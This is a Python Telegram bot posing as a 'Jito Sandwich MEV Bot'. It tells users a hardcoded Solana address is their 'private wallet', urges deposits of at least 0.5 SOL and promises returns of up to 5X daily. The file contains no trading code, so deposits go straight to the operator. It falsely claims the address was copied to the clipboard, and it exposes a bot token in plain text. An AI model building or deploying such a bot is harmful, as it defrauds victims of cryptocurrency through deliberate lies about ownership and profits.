from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackContext, CallbackQueryHandler

# Your wallet address
WALLET_ADDRESS = "4kGusmWgsZhLeRirCaeUNEAkbHTfeDVNc8eeJvoZtPiT"

# Start command handler
async def start(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text(
        "Name: Jito Sandwich MEV Bot 2.0 🥪\n\n"
        "💼 This is your private MevBot wallet address.\n\n"
        "💸 Deposit at least 0.5 SOL to start 🚀\n\n"
        "Type /startmev to begin frontrunning.\n\n"
        "💹 Profits:\n"
        "✨ 1 SOL = 1.25X/daily\n"
        "✨ 2 SOL = 2X/daily\n"
        "✨ 4 SOL = 3.5X/daily\n"
        "✨ 8 SOL = 5X/daily\n\n"
        "⚠️ Note: We take a 1% fee on profits."
    )

# Startmev command handler
async def startmev(update: Update, context: CallbackContext) -> None:
    keyboard = [
        [InlineKeyboardButton("📋 (Tap To Copy)", callback_data="copy_address")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🤖 Starting MevBot once funds are received...\n\n"
        "🔄 Deposit to your address to start frontrunning.\n"
        f"📋 (Tap To Copy) {WALLET_ADDRESS}\n\n"
        "💼 This is your private wallet.",
        reply_markup=reply_markup
    )

async def button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(text=f"📋 {WALLET_ADDRESS} copied to clipboard!")

def main() -> None:
    # Your bot token
    TOKEN = "7001542183:AAHO-cpFDGNTSUgAUQgaj6zbluNuAflbBCk"
    
    application = ApplicationBuilder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("startmev", startmev))
    application.add_handler(CallbackQueryHandler(button, pattern="copy_address"))

    application.run_polling()

if __name__ == '__main__':
    main()
